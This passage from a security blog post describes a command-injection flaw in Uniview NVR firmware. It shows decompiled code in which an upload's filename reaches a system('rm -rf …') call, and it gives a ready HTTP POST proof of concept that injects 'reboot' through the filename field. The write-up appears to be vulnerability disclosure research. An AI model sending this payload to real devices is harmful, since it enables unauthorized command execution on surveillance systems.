class="number">1</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x1163</span>,</span><br><span class="line">                                  <span class="string">&quot;CGI_COMMON_Get_FileNameFromContent_Disposition&quot;</span>,</span><br><span class="line">                                  <span class="string">&quot;find fileName is NULL.&quot;</span>,pcVar6);</span><br><span class="line">                      BP_WriteLog(<span class="number">4</span>,<span class="number">1</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x1210</span>,</span><br><span class="line">                                  <span class="string">&quot;LAPI_COMMON_GET_Upload_FileFromExtern&quot;</span>,</span><br><span class="line">                                  <span class="string">&quot;Get Content-Disposition filename fail.&quot;</span>);</span><br><span class="line">                      <span class="built_in">free</span>(pcVar2);</span><br><span class="line">                      <span class="keyword">return</span> <span class="number">0xea9e</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pcVar6 = pcVar5 + <span class="number">9</span>;</span><br><span class="line">                    <span class="keyword">if</span> (pcVar5[<span class="number">9</span>] == <span class="string">&#x27;\r&#x27;</span> || pcVar5[<span class="number">9</span>] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                      iVar11 = <span class="number">-2</span>;</span><br><span class="line">                      sVar4 = <span class="number">0xffffffff</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                      sVar12 = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">do</span> &#123;</span><br><span class="line">                        sVar4 = sVar12;</span><br><span class="line">                        pcVar6 = pcVar6 + <span class="number">1</span>;</span><br><span class="line">                        sVar12 = sVar4 + <span class="number">1</span>;</span><br><span class="line">                      &#125; <span class="keyword">while</span> (*pcVar6 != <span class="string">&#x27;\r&#x27;</span> &amp;&amp; *pcVar6 != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">                      iVar11 = sVar4 - <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">strncpy</span>(acStack_128,pcVar5 + <span class="number">10</span>,sVar4);</span><br><span class="line">                    acStack_128[iVar11] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    pcVar5 = (<span class="type">char</span> *)BP_strlstr(acStack_128,<span class="string">&#x27;\\&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (pcVar5 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                      sVar4 = <span class="built_in">strlen</span>(acStack_128);</span><br><span class="line">                      <span class="built_in">strncpy</span>(param_3,acStack_128,sVar4 + <span class="number">1</span>);<span class="comment">//这里将获取的filename，cpy到param_3中</span></span><br><span class="line">                      param_3[sVar4] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                      sVar4 = <span class="built_in">strlen</span>(pcVar5);</span><br><span class="line">                      <span class="built_in">strncpy</span>(param_3,pcVar5 + <span class="number">1</span>,sVar4 + <span class="number">1</span>);</span><br><span class="line">                      sVar4 = <span class="built_in">strlen</span>(pcVar5);</span><br><span class="line">                      param_3[sVar4] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    iVar7 = iVar7 + iVar8;</span><br><span class="line">                    BP_snprintf(acStack_a8,<span class="number">0x80</span>,<span class="string">&quot;%s/%s&quot;</span>,param_1,param_3);<span class="comment">//将param_3格式化到acStack_a8中</span></span><br><span class="line">                    pcVar5 = <span class="built_in">strstr</span>(pcVar2 + iVar7 + <span class="number">2</span>,<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> ((pcVar5 == (<span class="type">char</span> *)<span class="number">0x0</span>) ||</span><br><span class="line">                       (iVar8 = (<span class="type">int</span>)pcVar5 - (<span class="type">int</span>)(pcVar2 + iVar7 + <span class="number">2</span>), iVar8 &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                      pcVar1 = <span class="string">&quot;Failed to find the \\r\\n after Content-Type.&quot;</span>;</span><br><span class="line">                      uVar9 = <span class="number">0x122c</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                      sVar4 = <span class="built_in">strlen</span>(pcVar1);</span><br><span class="line">                      iVar8 = iVar7 + <span class="number">6</span> + iVar8;</span><br><span class="line">                      sVar4 = ((sVar3 - iVar8) - sVar4) - <span class="number">8</span>;</span><br><span class="line">                      BP_WriteLog(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x1237</span>,</span><br><span class="line">                                  <span class="string">&quot;LAPI_COMMON_GET_Upload_FileFromExtern&quot;</span>,<span class="string">&quot;Program.bin length = %lu&quot;</span></span><br><span class="line">                                  ,sVar4);</span><br><span class="line">                      <span class="keyword">if</span> (<span class="number">-1</span> &lt; (<span class="type">int</span>)sVar4) &#123;</span><br><span class="line">                        BP_snprintf(acStack_1a8,<span class="number">0x80</span>,<span class="string">&quot;rm -rf %s 1&gt;/dev/null 2&gt;&amp;1&quot;</span>,acStack_a8);<span class="comment">//这里再一次格式acStack_a8</span></span><br><span class="line">                        BP_WriteLog(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x50000</span>,<span class="string">&quot;cgi_public.c&quot;</span>,<span class="number">0x1242</span>,</span><br><span class="line">                                    <span class="string">&quot;LAPI_COMMON_GET_Upload_FileFromExtern&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;Delete File_Path = [%s].&quot;</span>,acStack_1a8);</span><br><span class="line">                        system(acStack_1a8); <span class="comment">//最后在这里执行了命令</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>聪明的小朋友很快就会发现这是个对于文件上传包的处理，没错我们只需要构造一个上传的包并更改filename的值就可以注入命令了</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><div class="code-container" data-rel="Https"><figure class="iseeu highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/LAPI/V1.0/PTZ/CustomProtocal/Configuration?TaskID=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Digest username=&quot;aaa&quot;,realm=&quot;NVRDVR&quot;,qop=auth, nonce=&quot;1212883611&quot;,algorithm=MD5,cnonce=&quot;770278536&quot;,nc=00000001,uri=&quot;/LAPI/V1.0/System/Security/Login&quot;,response=&quot;dcf0ef5d8f3fc7ee2733685c7debc953&quot;</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>211</span><br><span class="line"></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundary7MA4YWxkTrZu0gW</span></span><br><span class="line"><span class="language-fortran">Content-Disposition: <span class="keyword">form</span>-<span class="keyword">data</span>; <span class="keyword">name</span>=<span class="string">&quot;ptzCfgFile&quot;</span>; filename=<span class="string">&quot;y`reboot`a&quot;</span></span></span><br><span class="line"><span class="language-fortran">Content-<span class="keyword">Type</span>: multipart/<span class="keyword">form</span>-<span class="keyword">data</span></span></span><br><span class="line"><span class="language-fortran"></span></span><br><span class="line"><span class="language-fortran">aaaaa</span></span><br><span class="line"><span class="language-fortran">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span></span><br><span class="line"><span class="language-fortran"></span></span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Uniview NVR command injection</li>
+        <li><strong>Author:</strong> Zhiyuan</li>
+        <li><strong>Created at
+                :</strong> 2024-07-29 21:43:43</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-05-16 22:33:14
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/07/29/Uniview-NVR-RCE/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/IoT/">#IoT</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Vulnerability/">#Vulnerability</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Uniview/">#Uniview</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2024/11/11/Pwn2Own-2024-QHora-322/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Pwn2Own-2024-QHora-322</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2024/02/06/hillstonenet/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">山石网科云鉴存在前台任意命令执行漏洞</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Uniview NVR command injection</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9C%AC"><span class="nav-text">版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-text">细节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-text">poc</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Zhiyuan</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        6 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
